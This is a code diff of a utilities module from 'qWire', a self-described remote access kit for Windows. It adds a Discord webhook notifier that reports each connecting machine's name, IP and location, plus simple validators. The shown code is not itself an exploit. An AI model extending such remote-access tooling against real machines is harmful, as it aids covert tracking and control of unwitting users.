@@ -10,14 +10,16 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 from PyQt5 import QtWidgets
 from PyQt5 import QtGui
 from playsound import playsound
+from ..utils.file_paths import CFGFilePath,LoggingUtilitys
 
 import notify2
 import os
+import requests
 
 class ErrorHandling():
     #Function will raise an error. Needs an icon
@@ -53,6 +55,15 @@ class Notifications():
         notification.setWindowTitle(window_title)
         notification.exec_()
 
+    #Function will raise a notification via discord if the setting is enabled
+    def discord_notify(self,system_name,ip_address,location):
+        message = {
+            'content': f'{system_name} has connected from {location} at {ip_address}.'  #Set content for message
+        }
+        requests.post(LoggingUtilitys().retrieve_file_data(CFGFilePath().discord_webhook)
+                      ,data=message)  #Send the notification to discord
+
+
 class Validation():
 
     #Function will validate port number. Valid port will return true, invalid will return false
@@ -71,6 +82,18 @@ class Validation():
                                             'Invalid Data Type')
             return False                                                        #Return false
 
+    #Function will validate a webhook parameter and return bool based on response from server
+    def validate_discord_webhook(self,webhook):
+        test_message = {'content':'This is a test message from the qWire server. ' #Set the message for the discord server
+                                  'If you see this message, your webhook is valid and you will now receive notifications via discord.'}
+        web_req = requests.post(webhook,test_message)                              #Create web request object and send post request to server with message
+        discord_server_response = str(web_req.status_code)                         #Create string obj with status code
+        if discord_server_response == '204':                                       #If the code is 204, the message was sent successfully
+            return True                                                            #Webhook is valid, return true
+        elif discord_server_response == '401':                                     #If response is 401, Webhook is invalid
+            return False                                                           #Return false, webhook is invalid
+        return False                                                               #Anything else, return false as the webhook is not valid
+
     #Function will validate file extention parameter
     def validate_extention(self,file_name,file_extention):
         try:
@@ -80,3 +103,11 @@ class Validation():
             return False                            #else return false
         except IndexError:                          #If their is no .
             return False                            #Return false
+
+    #Function will validate an integer date type
+    def validate_integer(self,integer):
+        try:                #Start try block to catch error
+            int(integer)    #Set integer to int data type
+            return True     #Return true
+        except Exception:   #If the data can't be set to the integer data type,
+            return False    #Return false as it could not be validated
